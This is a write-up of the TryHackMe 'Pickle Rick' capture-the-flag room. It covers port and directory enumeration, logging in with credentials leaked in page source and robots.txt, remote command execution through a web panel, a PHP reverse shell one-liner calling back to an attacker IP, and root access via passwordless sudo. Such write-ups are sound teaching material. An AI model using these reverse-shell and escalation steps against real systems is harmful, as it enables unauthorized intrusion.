# 🥒 Pickle Rick - TryHackMe Write-up

## 📌 Overview
The description of the room is: ״A Rick and Morty CTF. Help turn Rick back into a human!״
This room is a beginner-level penetration testing challenge on TryHackMe based on the *Rick and Morty* theme.
In this room you are asked to explore and enumrate a web-application, gain access to the machine and retrive flags.

The target IP address was: 10.114.180.176

---

## 1. Reconnaissance: 🔍
I initially performed enumeration with Nmap to identify open ports and services, version and OS on the target machine by using the following command:

nmap 10.114.180.176 -sV -sC -T5 -p- -A -O -o ~/active/output/nmap_result.txt

The scan revealed:
- Port 22: SSH
- Port 80: HTTP (web application)

I used Firefox to gain access to the website by using the IP address in the URL box.

I opened the source code and there was a note containing a username:
<img width="1599" height="1265" alt="10 114 180 176_Source_code" src="https://github.com/user-attachments/assets/3976ff51-551d-418b-a7b4-bbfe6c6e3f09" />

The note said: "Note to self, remember username! Username: R1ckRul3s"

I saved it using:

echo "Username: R1ckRul3s" > output/creds.txt

---

## 2. Web Enumeration: 🌐

After accessing the web application, I used gobuster to look for more files and directories in to the web application.
the command I used combined gobuster and the dirbuster directory:

gobuster dir -u 'http://10.114.180.176' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x .php,.txt,.js,.json -o ~/active/output/gobuster_result.txt

❗ Please note that if you want to run the same command I used, the command takes a few minutes to finish execute due to the large number of words in the wordlist. I did configure the command to use 64 threads instead of the default 10 so it should make the process quicker.

The scan results were successful with:
* /login.php
## <img width="1598" height="1265" alt="login page" src="https://github.com/user-attachments/assets/f341b444-7625-4211-b40c-5a1939e35006" />

* /assets (had a few gifs and photos from the series. no relevant metadata found usind exiftool after downloading them)
## <img width="1599" height="1262" alt="assets" src="https://github.com/user-attachments/assets/0867770f-bbed-4ea8-b034-a22ce808de6d" />

* /portal.php [--> /login.php]

* /robots.txt ("Wubbalubbadubdub")

* /denied.php [--> /login.php]

* /clue.txt ("Look around the file system for the other ingredient")

---

Using the known Username and the iconic string from robots.txt as a password I got access the the /portal.php which had a "Command Panel" and an "Execute" button.

<img width="1599" height="1264" alt="Screen Shot 2026-06-24 at 12 12 26 PM" src="https://github.com/user-attachments/assets/f610ed52-7044-4a7c-80b1-ef0466f619b2" />

---

## 3. Exploitation: 💥

A command execution vulnerability was identified in the web application.
This allowed remote code execution (RCE) on the target machine.

In order to find what type of shell access I have, I used "echo &0" and discovered its Bash.

Using this access, I was able to find the current directory contents and by that finding the first ingredient:
<img width="3196" height="2524" alt="RCEvuln" src="https://github.com/user-attachments/assets/0f36e8a2-8a1c-4b88-ad41-2ce840f4ad44" />

I understood now the clue.txt saying I should look for the other flag and I prefered using the terminal for it so I made a reverse shell command.
a simple bash one didn't work so I used a php one. the command was:

php -r '$sock=fsockopen("192.168.132.219",9000);exec("sh <&3 >&3 2>&3");'

and I got access!
<img width="3194" height="2526" alt="updated_reverse_shell" src="https://github.com/user-attachments/assets/579522f2-a6e9-4d6d-beef-afc8abc4b167" />

in the terminal I looked for /home to look for users and found "rick".
I used "ls" and found a file named "second ingredients"

I used: cat "second ingredients" and got the second ingredients!
<img width="3194" height="394" alt="second flag" src="https://github.com/user-attachments/assets/cc97e1f9-9b25-4f14-a743-840468611f6f" />

---

## 4. Privilege Escalation: 🚀

For the last ingredient I wanted to look at the /root directory. I didn't have access so I checked which sudo commands I was able to run without needing a password using:

sudo -l

and found I can use all commands without password. I then opened a bash shell as root using:

sudo bash -i

Then, looked at the /root directory and found the 3rd file holding the last ingredient:

<img width="3166" height="898" alt="last flag" src="https://github.com/user-attachments/assets/d50467de-16b6-4ae2-944a-d731381abed8" />


---

## Flags: 🏁 

* 1st Flag: Retrieved from web directory.
* 2nd Flag: Retrieved from reverse shell at rick's directory.
* Root Flag: Retrieved after privilege escalation.

---

## Key Takeaways: 🧠

* Importance of thorough web enumeration
* Impottance of the "Least Privilege" Principle

---

## Disclaimer: ⚠️

This work was performed in a controlled, legal lab environment provided by TryHackMe for educational purposes only.
